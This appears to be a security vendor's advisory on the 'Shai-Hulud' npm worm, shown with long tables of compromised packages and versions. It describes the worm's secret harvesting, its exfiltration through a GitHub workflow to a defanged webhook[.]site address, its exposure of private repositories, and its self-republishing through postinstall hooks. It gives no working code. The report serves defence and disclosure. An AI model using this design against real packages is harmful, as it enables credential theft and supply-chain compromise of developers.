2.0.9</td></tr><tr><td>@nstudio/nativescript-loading-indicator</td><td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td></tr><tr><td>@nstudio/ui-collectionview</td><td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td></tr><tr><td>@nstudio/web</td><td>20.0.4</td></tr><tr><td>@nstudio/web-angular</td><td>20.0.4</td></tr><tr><td>@nstudio/xplat</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@nstudio/xplat-utils</td><td>20.0.5, 20.0.6, 20.0.7</td></tr><tr><td>@operato/board</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/data-grist</td><td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/graphql</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/headroom</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/help</td><td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/i18n</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/input</td><td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/layout</td><td>9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/popup</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@operato/pull-to-refresh</td><td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td></tr><tr><td>@operato/shell</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td></tr><tr><td>@operato/styles</td><td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td></tr><tr><td>@operato/utils</td><td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td></tr><tr><td>@teselagen/bounce-loader</td><td>0.3.16, 0.3.17</td></tr><tr><td>@teselagen/liquibase-tools</td><td>0.4.1</td></tr><tr><td>@teselagen/range-utils</td><td>0.3.14, 0.3.15</td></tr><tr><td>@teselagen/react-list</td><td>0.8.19, 0.8.20</td></tr><tr><td>@teselagen/react-table</td><td>6.10.19</td></tr><tr><td>@thangved/callback-window</td><td>1.1.4</td></tr><tr><td>@things-factory/attachment-base</td><td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td></tr><tr><td>@things-factory/auth-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/email-base</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td></tr><tr><td>@things-factory/env</td><td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-base</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/integration-marketplace</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@things-factory/shell</td><td>9.0.43, 9.0.44, 9.0.45</td></tr><tr><td>@tnf-dev/api</td><td>1.0.8</td></tr><tr><td>@tnf-dev/core</td><td>1.0.8</td></tr><tr><td>@tnf-dev/js</td><td>1.0.8</td></tr><tr><td>@tnf-dev/mui</td><td>1.0.8</td></tr><tr><td>@tnf-dev/react</td><td>1.0.8</td></tr><tr><td>@ui-ux-gang/devextreme-angular-rpk</td><td>24.1.7</td></tr><tr><td>@yoobic/design-system</td><td>6.5.17</td></tr><tr><td>@yoobic/jpeg-camera-es6</td><td>1.0.13</td></tr><tr><td>@yoobic/yobi</td><td>8.7.53</td></tr><tr><td>airchief</td><td>0.3.1</td></tr><tr><td>airpilot</td><td>0.8.8</td></tr><tr><td>angulartics2</td><td>14.1.1, 14.1.2</td></tr><tr><td>browser-webdriver-downloader</td><td>3.0.8</td></tr><tr><td>capacitor-notificationhandler</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-healthapp</td><td>0.0.2, 0.0.3</td></tr><tr><td>capacitor-plugin-ihealth</td><td>1.1.8, 1.1.9</td></tr><tr><td>capacitor-plugin-vonage</td><td>1.0.2, 1.0.3</td></tr><tr><td>capacitorandroidpermissions</td><td>0.0.4, 0.0.5</td></tr><tr><td>config-cordova</td><td>0.8.5</td></tr><tr><td>cordova-plugin-voxeet2</td><td>1.0.24</td></tr><tr><td>cordova-voxeet</td><td>1.0.32</td></tr><tr><td>create-hest-app</td><td>0.1.9</td></tr><tr><td>db-evo</td><td>1.1.4, 1.1.5</td></tr><tr><td>devextreme-angular-rpk</td><td>21.2.8</td></tr><tr><td>ember-browser-services</td><td>5.0.2, 5.0.3</td></tr><tr><td>ember-headless-form</td><td>1.1.2, 1.1.3</td></tr><tr><td>ember-headless-form-yup</td><td>1.0.1</td></tr><tr><td>ember-headless-table</td><td>2.1.5, 2.1.6</td></tr><tr><td>ember-url-hash-polyfill</td><td>1.0.12, 1.0.13</td></tr><tr><td>ember-velcro</td><td>2.2.1, 2.2.2</td></tr><tr><td>encounter-playground</td><td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td></tr><tr><td>eslint-config-crowdstrike</td><td>11.0.2, 11.0.3</td></tr><tr><td>eslint-config-crowdstrike-node</td><td>4.0.3, 4.0.4</td></tr><tr><td>eslint-config-teselagen</td><td>6.1.7</td></tr><tr><td>globalize-rpk</td><td>1.7.4</td></tr><tr><td>graphql-sequelize-teselagen</td><td>5.3.8</td></tr><tr><td>html-to-base64-image</td><td>1.0.2</td></tr><tr><td>json-rules-engine-simplified</td><td>0.2.1</td></tr><tr><td>jumpgate</td><td>0.0.2</td></tr><tr><td>koa2-swagger-ui</td><td>5.11.1, 5.11.2</td></tr><tr><td>mcfly-semantic-release</td><td>1.3.1</td></tr><tr><td>mcp-knowledge-base</td><td>0.0.2</td></tr><tr><td>mcp-knowledge-graph</td><td>1.2.1</td></tr><tr><td>mobioffice-cli</td><td>1.0.3</td></tr><tr><td>monorepo-next</td><td>13.0.1, 13.0.2</td></tr><tr><td>mstate-angular</td><td>0.4.4</td></tr><tr><td>mstate-cli</td><td>0.4.7</td></tr><tr><td>mstate-dev-react</td><td>1.1.1</td></tr><tr><td>mstate-react</td><td>1.6.5</td></tr><tr><td>ng2-file-upload</td><td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td></tr><tr><td>ngx-bootstrap</td><td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td></tr><tr><td>ngx-color</td><td>10.0.1, 10.0.2</td></tr><tr><td>ngx-toastr</td><td>19.0.1, 19.0.2</td></tr><tr><td>ngx-trend</td><td>8.0.1</td></tr><tr><td>ngx-ws</td><td>1.1.5, 1.1.6</td></tr><tr><td>oradm-to-gql</td><td>35.0.14, 35.0.15</td></tr><tr><td>oradm-to-sqlz</td><td>1.1.2</td></tr><tr><td>ove-auto-annotate</td><td>0.0.9</td></tr><tr><td>pm2-gelf-json</td><td>1.0.4, 1.0.5</td></tr><tr><td>printjs-rpk</td><td>1.6.1</td></tr><tr><td>react-complaint-image</td><td>0.0.32</td></tr><tr><td>react-jsonschema-form-conditionals</td><td>0.3.18</td></tr><tr><td>remark-preset-lint-crowdstrike</td><td>4.0.1, 4.0.2</td></tr><tr><td>rxnt-authentication</td><td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td></tr><tr><td>rxnt-healthchecks-nestjs</td><td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td></tr><tr><td>rxnt-kue</td><td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td></tr><tr><td>swc-plugin-component-annotate</td><td>1.9.1, 1.9.2</td></tr><tr><td>tbssnch</td><td>1.0.2</td></tr><tr><td>teselagen-interval-tree</td><td>1.1.2</td></tr><tr><td>tg-client-query-builder</td><td>2.14.4, 2.14.5</td></tr><tr><td>tg-redbird</td><td>1.3.1</td></tr><tr><td>tg-seq-gen</td><td>1.0.9, 1.0.10</td></tr><tr><td>thangved-react-grid</td><td>1.0.3</td></tr><tr><td>ts-gaussian</td><td>3.0.5, 3.0.6</td></tr><tr><td>ts-imports</td><td>1.0.1, 1.0.2</td></tr><tr><td>tvi-cli</td><td>0.1.5</td></tr><tr><td>ve-bamreader</td><td>0.2.6</td></tr><tr><td>ve-editor</td><td>1.0.1</td></tr><tr><td>verror-extra</td><td>6.0.1</td></tr><tr><td>voip-callkit</td><td>1.0.2, 1.0.3</td></tr><tr><td>wdio-web-reporter</td><td>0.1.3</td></tr><tr><td>yargs-help-output</td><td>5.0.3</td></tr><tr><td>yoo-styles</td><td>6.0.326</td></tr></tbody></table></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://cdn.prod.website-files.com/642adcaf364024654c71df23/68c936379bfcdd38371b2acc_Group%202147255852.png' /></section><section class='parsed-content'><div><div><div><div><p>Published on:</p><p>September 16, 2025</p></div><div><p>Last updated on:</p><p>September 19, 2025</p></div></div><div><p>This morning, we were alerted to a large-scale attack against npm. This appears to the be work of the same threat actors behind the Nx attack on August 27th 2025.&nbsp;This was originally published by <a href="https://socket.dev/blog/tinycolor-supply-chain-attack-affects-40-packages">Socket</a> and <a href="https://www.stepsecurity.io/blog/ctrl-tinycolor-and-40-npm-packages-compromised">StepSecurity</a> who noted 40 packages had been comrpomised, since then an additional 147 packages have been infected with malware including packages from CrowdStrike. </p><p>The scale, scope and impact of this attack is significant. The attackers are using the same playbook in large parts as the original attack, but have stepped up their game. They have turned it into a full worm, which does these things automatically:</p><ul><li>Steal secrets and publish them to GitHub publicly</li><li>Run trufflehog and query Cloud metadata endpoints to gather secrets</li><li>Attempt to create a new GitHub action with a data exiltration mechanism through webhook[.]site</li><li>Iterate the repositories on GitHub a user has access to, and make them public<br></li></ul><p>Since our initial alert this morning we&rsquo;ve confirmed the following additional behaviours and important details. For those that don't know, Shai&nbsp;Hulud is the name for the worm in the Dune franchise. A clear indication of the intent of the attackers.</p><figure><figcaption><em>Shai&nbsp;Hulud, from Dune</em></figcaption></figure><p>To avoid being compromised by packages like this, check out Aikido <a href="https://www.aikido.dev/blog/introducing-safe-chain">safe-chain</a>!</p><h2>What the worm does </h2><ul><li><strong>Harvest</strong>: scans the host and CI environment for secrets &mdash; process.env, scanning with TruffleHog, and cloud metadata endpoints (AWS/GCP) that return instance/service credentials.<br></li><li><strong>Exfiltrate (1) &mdash; GitHub repo</strong>: creates a repo named <strong>Shai-Hulud</strong> under the compromised account and commits a JSON dump containing system info, environment variables, and collected secrets.<br></li><li><strong>Exfiltrate (2) &mdash; GitHub Actions &rarr; webhook</strong>: drops a workflow <code>.github/workflows/shai-hulud-workflow.yml</code> that serializes <code>${{ toJSON(secrets) }}</code>, POSTs them to an attacker <code>webhook[.]site</code> URL and writes a double-base64 copy into the Actions logs.<br></li><li><strong>Propagate</strong>: uses any valid npm tokens it finds to enumerate and attempt to update packages the compromised maintainer controls (supply-chain propagation).<br></li><li><strong>Amplify</strong>: iterates the victim&rsquo;s accessible repositories, making them public or adding the workflow/branch that will trigger further runs and leaks.</li></ul><p>&zwj;</p><h2>Leaking of secrets</h2><p>As with the original Nx attack, we're seeing the attackers doing a smash-and-grab style attack. The malicous payload both publishes a "Shai-Hulud"&nbsp;repository with stolen credentials/tokens, and it will go through a GitHub account and turn private repository to public:</p><p>&zwj;</p><figure><figcaption><em>Stolen credentials being published</em></figcaption></figure><p>&zwj;</p><figure><figcaption><em>Private repositories being turned public</em></figcaption></figure><p>&zwj;</p><h2>Self-propogation through npm</h2><p>One of the most striking features of this attack is that it behaves like a <strong>true worm</strong>. Rather than relying on a single infected package to spread, the code is designed to <strong>re-publish itself into other npm packages</strong> owned by the compromised maintainer.</p><p>Here&rsquo;s how the worm logic works:</p><ul><li><strong>Download a target tarball</strong> &ndash; it fetches an existing package version from the npm registry.</li><li><strong>Modify <code>package.json</code></strong> &ndash; the worm bumps the patch version (e.g. <code>1.2.3 &rarr; 1.2.4</code>) and inserts a new lifecycle hook&nbsp;(<code>postinstall</code>)<code>&zwj;</code></li><li><strong>Copy its own payload</strong> &ndash; the running script (<code>process.argv[1]</code>) is written into the tarball as <code>bundle.js</code>. This ensures that whatever code infected one package now lives inside the next.</li><li><strong>Re-publish the trojanized package</strong> &ndash; the modified tarball is gzipped and pushed back to npm using the maintainer&rsquo;s credentials.</li></ul><p>This cycle allows the malware to <strong>continuously infect every package</strong> a maintainer has access to. Each published package becomes a new distribution vector: as soon as someone installs it, the worm executes, replicates, and pushes itself further into the ecosystem.</p><div><p>In short: the attacker doesn&rsquo;t need to manually target packages. Once a single environment is compromised, the worm automates the spread by <strong>piggybacking on the maintainer&rsquo;s own publishing rights</strong>.</p><p>For a complete malware breakdown we recommend reviewing the<a href="https://www.getsafety.com/blog-posts/shai-hulud-npm-attack"> getsafety post </a></p></div><h2>Impacted packages</h2><div><table> <thead> <tr> <th>Package</th> <th>Versions</th> </tr> </thead> <tbody> <tr> <td>@ahmedhfarag/ngx-perfect-scrollbar</td> <td>20.0.20</td> </tr> <tr> <td>@ahmedhfarag/ngx-virtual-scroller</td> <td>4.0.4</td> </tr> <tr> <td>@art-ws/common</td> <td>2.0.28</td> </tr> <tr> <td>@art-ws/config-eslint</td> <td>2.0.4, 2.0.5</td> </tr> <tr> <td>@art-ws/config-ts</td> <td>2.0.7, 2.0.8</td> </tr> <tr> <td>@art-ws/db-context</td> <td>2.0.24</td> </tr> <tr> <td>@art-ws/di</td> <td>2.0.28, 2.0.32</td> </tr> <tr> <td>@art-ws/di-node</td> <td>2.0.13</td> </tr> <tr> <td>@art-ws/eslint</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/fastify-http-server</td> <td>2.0.24, 2.0.27</td> </tr> <tr> <td>@art-ws/http-server</td> <td>2.0.21, 2.0.25</td> </tr> <tr> <td>@art-ws/openapi</td> <td>0.1.9, 0.1.12</td> </tr> <tr> <td>@art-ws/package-base</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/prettier</td> <td>1.0.5, 1.0.6</td> </tr> <tr> <td>@art-ws/slf</td> <td>2.0.15, 2.0.22</td> </tr> <tr> <td>@art-ws/ssl-info</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>@art-ws/web-app</td> <td>1.0.3, 1.0.4</td> </tr> <tr> <td>@crowdstrike/commitlint</td> <td>8.1.1, 8.1.2</td> </tr> <tr> <td>@crowdstrike/falcon-shoelace</td> <td>0.4.1, 0.4.2</td> </tr> <tr> <td>@crowdstrike/foundry-js</td> <td>0.19.1, 0.19.2</td> </tr> <tr> <td>@crowdstrike/glide-core</td> <td>0.34.2, 0.34.3</td> </tr> <tr> <td>@crowdstrike/logscale-dashboard</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-file-editor</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-parser-edit</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/logscale-search</td> <td>1.205.1, 1.205.2</td> </tr> <tr> <td>@crowdstrike/tailwind-toucan-base</td> <td>5.0.1, 5.0.2</td> </tr> <tr> <td>@ctrl/deluge</td> <td>7.2.1, 7.2.2</td> </tr> <tr> <td>@ctrl/golang-template</td> <td>1.4.2, 1.4.3</td> </tr> <tr> <td>@ctrl/magnet-link</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>@ctrl/ngx-codemirror</td> <td>7.0.1, 7.0.2</td> </tr> <tr> <td>@ctrl/ngx-csv</td> <td>6.0.1, 6.0.2</td> </tr> <tr> <td>@ctrl/ngx-emoji-mart</td> <td>9.2.1, 9.2.2</td> </tr> <tr> <td>@ctrl/ngx-rightclick</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@ctrl/qbittorrent</td> <td>9.7.1, 9.7.2</td> </tr> <tr> <td>@ctrl/react-adsense</td> <td>2.0.1, 2.0.2</td> </tr> <tr> <td>@ctrl/shared-torrent</td> <td>6.3.1, 6.3.2</td> </tr> <tr> <td>@ctrl/tinycolor</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/torrent-file</td> <td>4.1.1, 4.1.2</td> </tr> <tr> <td>@ctrl/transmission</td> <td>7.3.1</td> </tr> <tr> <td>@ctrl/ts-base32</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>@hestjs/core</td> <td>0.2.1</td> </tr> <tr> <td>@hestjs/cqrs</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/demo</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/eslint-config</td> <td>0.1.2</td> </tr> <tr> <td>@hestjs/logger</td> <td>0.1.6</td> </tr> <tr> <td>@hestjs/scalar</td> <td>0.1.7</td> </tr> <tr> <td>@hestjs/validation</td> <td>0.1.6</td> </tr> <tr> <td>@nativescript-community/arraybuffers</td> <td>1.1.6, 1.1.7, 1.1.8</td> </tr> <tr> <td>@nativescript-community/gesturehandler</td> <td>2.0.35</td> </tr> <tr> <td>@nativescript-community/perms</td> <td>3.0.5, 3.0.6, 3.0.7, 3.0.8</td> </tr> <tr> <td>@nativescript-community/sqlite</td> <td>3.5.2, 3.5.3, 3.5.4, 3.5.5</td> </tr> <tr> <td>@nativescript-community/text</td> <td>1.6.9, 1.6.10, 1.6.11, 1.6.12</td> </tr> <tr> <td>@nativescript-community/typeorm</td> <td>0.2.30, 0.2.31, 0.2.32, 0.2.33</td> </tr> <tr> <td>@nativescript-community/ui-collectionview</td> <td>6.0.6</td> </tr> <tr> <td>@nativescript-community/ui-document-picker</td> <td>1.1.27, 1.1.28</td> </tr> <tr> <td>@nativescript-community/ui-drawer</td> <td>0.1.30</td> </tr> <tr> <td>@nativescript-community/ui-image</td> <td>4.5.6</td> </tr> <tr> <td>@nativescript-community/ui-label</td> <td>1.3.35, 1.3.36, 1.3.37</td> </tr> <tr> <td>@nativescript-community/ui-material-bottom-navigation</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-bottomsheet</td> <td>7.2.72</td> </tr> <tr> <td>@nativescript-community/ui-material-core</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-core-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-ripple</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-material-tabs</td> <td>7.2.72, 7.2.73, 7.2.74, 7.2.75</td> </tr> <tr> <td>@nativescript-community/ui-pager</td> <td>14.1.36, 14.1.37, 14.1.38</td> </tr> <tr> <td>@nativescript-community/ui-pulltorefresh</td> <td>2.5.4, 2.5.5, 2.5.6, 2.5.7</td> </tr> <tr> <td>@nexe/config-manager</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/eslint-config</td> <td>0.1.1</td> </tr> <tr> <td>@nexe/logger</td> <td>0.1.3</td> </tr> <tr> <td>@nstudio/angular</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/focus</td> <td>20.0.4, 20.0.5, 20.0.6</td> </tr> <tr> <td>@nstudio/nativescript-checkbox</td> <td>2.0.6, 2.0.7, 2.0.8, 2.0.9</td> </tr> <tr> <td>@nstudio/nativescript-loading-indicator</td> <td>5.0.1, 5.0.2, 5.0.3, 5.0.4</td> </tr> <tr> <td>@nstudio/ui-collectionview</td> <td>5.1.11, 5.1.12, 5.1.13, 5.1.14</td> </tr> <tr> <td>@nstudio/web</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/web-angular</td> <td>20.0.4</td> </tr> <tr> <td>@nstudio/xplat</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@nstudio/xplat-utils</td> <td>20.0.5, 20.0.6, 20.0.7</td> </tr> <tr> <td>@operato/board</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/data-grist</td> <td>9.0.29, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/graphql</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/headroom</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/help</td> <td>9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/i18n</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/input</td> <td>9.0.27, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/layout</td> <td>9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/popup</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@operato/pull-to-refresh</td> <td>9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42</td> </tr> <tr> <td>@operato/shell</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39</td> </tr> <tr> <td>@operato/styles</td> <td>9.0.2, 9.0.35, 9.0.36, 9.0.37</td> </tr> <tr> <td>@operato/utils</td> <td>9.0.22, 9.0.35, 9.0.36, 9.0.37, 9.0.38, 9.0.39, 9.0.40, 9.0.41, 9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46</td> </tr> <tr> <td>@teselagen/bounce-loader</td> <td>0.3.16, 0.3.17</td> </tr> <tr> <td>@teselagen/liquibase-tools</td> <td>0.4.1</td> </tr> <tr> <td>@teselagen/range-utils</td> <td>0.3.14, 0.3.15</td> </tr> <tr> <td>@teselagen/react-list</td> <td>0.8.19, 0.8.20</td> </tr> <tr> <td>@teselagen/react-table</td> <td>6.10.19</td> </tr> <tr> <td>@thangved/callback-window</td> <td>1.1.4</td> </tr> <tr> <td>@things-factory/attachment-base</td> <td>9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50</td> </tr> <tr> <td>@things-factory/auth-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/email-base</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45, 9.0.46, 9.0.47, 9.0.48, 9.0.49, 9.0.50, 9.0.51, 9.0.52, 9.0.53, 9.0.54</td> </tr> <tr> <td>@things-factory/env</td> <td>9.0.42, 9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-base</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/integration-marketplace</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@things-factory/shell</td> <td>9.0.43, 9.0.44, 9.0.45</td> </tr> <tr> <td>@tnf-dev/api</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/core</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/js</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/mui</td> <td>1.0.8</td> </tr> <tr> <td>@tnf-dev/react</td> <td>1.0.8</td> </tr> <tr> <td>@ui-ux-gang/devextreme-angular-rpk</td> <td>24.1.7</td> </tr> <tr> <td>@yoobic/design-system</td> <td>6.5.17</td> </tr> <tr> <td>@yoobic/jpeg-camera-es6</td> <td>1.0.13</td> </tr> <tr> <td>@yoobic/yobi</td> <td>8.7.53</td> </tr> <tr> <td>airchief</td> <td>0.3.1</td> </tr> <tr> <td>airpilot</td> <td>0.8.8</td> </tr> <tr> <td>angulartics2</td> <td>14.1.1, 14.1.2</td> </tr> <tr> <td>browser-webdriver-downloader</td> <td>3.0.8</td> </tr> <tr> <td>capacitor-notificationhandler</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-healthapp</td> <td>0.0.2, 0.0.3</td> </tr> <tr> <td>capacitor-plugin-ihealth</td> <td>1.1.8, 1.1.9</td> </tr> <tr> <td>capacitor-plugin-vonage</td> <td>1.0.2, 1.0.3</td> </tr> <tr> <td>capacitorandroidpermissions</td> <td>0.0.4, 0.0.5</td> </tr> <tr> <td>config-cordova</td> <td>0.8.5</td> </tr> <tr> <td>cordova-plugin-voxeet2</td> <td>1.0.24</td> </tr> <tr> <td>cordova-voxeet</td> <td>1.0.32</td> </tr> <tr> <td>create-hest-app</td> <td>0.1.9</td> </tr> <tr> <td>db-evo</td> <td>1.1.4, 1.1.5</td> </tr> <tr> <td>devextreme-angular-rpk</td> <td>21.2.8</td> </tr> <tr> <td>ember-browser-services</td> <td>5.0.2, 5.0.3</td> </tr> <tr> <td>ember-headless-form</td> <td>1.1.2, 1.1.3</td> </tr> <tr> <td>ember-headless-form-yup</td> <td>1.0.1</td> </tr> <tr> <td>ember-headless-table</td> <td>2.1.5, 2.1.6</td> </tr> <tr> <td>ember-url-hash-polyfill</td> <td>1.0.12, 1.0.13</td> </tr> <tr> <td>ember-velcro</td> <td>2.2.1, 2.2.2</td> </tr> <tr> <td>encounter-playground</td> <td>0.0.2, 0.0.3, 0.0.4, 0.0.5</td> </tr> <tr> <td>eslint-config-crowdstrike</td> <td>11.0.2, 11.0.3</td> </tr> <tr> <td>eslint-config-crowdstrike-node</td> <td>4.0.3, 4.0.4</td> </tr> <tr> <td>eslint-config-teselagen</td> <td>6.1.7</td> </tr> <tr> <td>globalize-rpk</td> <td>1.7.4</td> </tr> <tr> <td>graphql-sequelize-teselagen</td> <td>5.3.8</td> </tr> <tr> <td>html-to-base64-image</td> <td>1.0.2</td> </tr> <tr> <td>json-rules-engine-simplified</td> <td>0.2.1</td> </tr> <tr> <td>jumpgate</td> <td>0.0.2</td> </tr> <tr> <td>koa2-swagger-ui</td> <td>5.11.1, 5.11.2</td> </tr> <tr> <td>mcfly-semantic-release</td> <td>1.3.1</td> </tr> <tr> <td>mcp-knowledge-base</td> <td>0.0.2</td> </tr> <tr> <td>mcp-knowledge-graph</td> <td>1.2.1</td> </tr> <tr> <td>mobioffice-cli</td> <td>1.0.3</td> </tr> <tr> <td>monorepo-next</td> <td>13.0.1, 13.0.2</td> </tr> <tr> <td>mstate-angular</td> <td>0.4.4</td> </tr> <tr> <td>mstate-cli</td> <td>0.4.7</td> </tr> <tr> <td>mstate-dev-react</td> <td>1.1.1</td> </tr> <tr> <td>mstate-react</td> <td>1.6.5</td> </tr> <tr> <td>ng2-file-upload</td> <td>7.0.2, 7.0.3, 8.0.1, 8.0.2, 8.0.3, 9.0.1</td> </tr> <tr> <td>ngx-bootstrap</td> <td>18.1.4, 19.0.3, 19.0.4, 20.0.3, 20.0.4, 20.0.5</td> </tr> <tr> <td>ngx-color</td> <td>10.0.1, 10.0.2</td> </tr> <tr> <td>ngx-toastr</td> <td>19.0.1, 19.0.2</td> </tr> <tr> <td>ngx-trend</td> <td>8.0.1</td> </tr> <tr> <td>ngx-ws</td> <td>1.1.5, 1.1.6</td> </tr> <tr> <td>oradm-to-gql</td> <td>35.0.14, 35.0.15</td> </tr> <tr> <td>oradm-to-sqlz</td> <td>1.1.2</td> </tr> <tr> <td>ove-auto-annotate</td> <td>0.0.9</td> </tr> <tr> <td>pm2-gelf-json</td> <td>1.0.4, 1.0.5</td> </tr> <tr> <td>printjs-rpk</td> <td>1.6.1</td> </tr> <tr> <td>react-complaint-image</td> <td>0.0.32</td> </tr> <tr> <td>react-jsonschema-form-conditionals</td> <td>0.3.18</td> </tr> <tr> <td>remark-preset-lint-crowdstrike</td> <td>4.0.1, 4.0.2</td> </tr> <tr> <td>rxnt-authentication</td> <td>0.0.3, 0.0.4, 0.0.5, 0.0.6</td> </tr> <tr> <td>rxnt-healthchecks-nestjs</td> <td>1.0.2, 1.0.3, 1.0.4, 1.0.5</td> </tr> <tr> <td>rxnt-kue</td> <td>1.0.4, 1.0.5, 1.0.6, 1.0.7</td> </tr> <tr> <td>swc-plugin-component-annotate</td> <td>1.9.1, 1.9.2</td> </tr> <tr> <td>tbssnch</td> <td>1.0.2</td> </tr> <tr> <td>teselagen-interval-tree</td> <td>1.1.2</td> </tr> <tr> <td>tg-client-query-builder</td> <td>2.14.4, 2.14.5</td> </tr> <tr> <td>tg-redbird</td> <td>1.3.1</td> </tr> <tr> <td>tg-seq-gen</td> <td>1.0.9, 1.0.10</td> </tr> <tr> <td>thangved-react-grid</td> <td>1.0.3</td> </tr> <tr> <td>ts-gaussian</td> <td>3.0.5, 